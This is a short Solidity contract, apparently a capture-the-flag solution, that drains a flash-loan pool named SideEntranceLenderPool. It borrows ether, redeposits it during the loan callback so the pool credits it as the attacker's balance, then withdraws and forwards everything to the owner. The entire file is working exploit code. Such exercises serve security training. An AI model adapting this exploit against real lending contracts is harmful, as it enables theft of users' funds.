import "../side-entrance/SideEntranceLenderPool.sol";

contract AttackSideEntrance {
    SideEntranceLenderPool pool;
    address payable owner;

    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
        owner = payable(msg.sender);
    }

    function attack(uint256 amount) external payable {
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {
        owner.transfer(address(this).balance);
    }
}
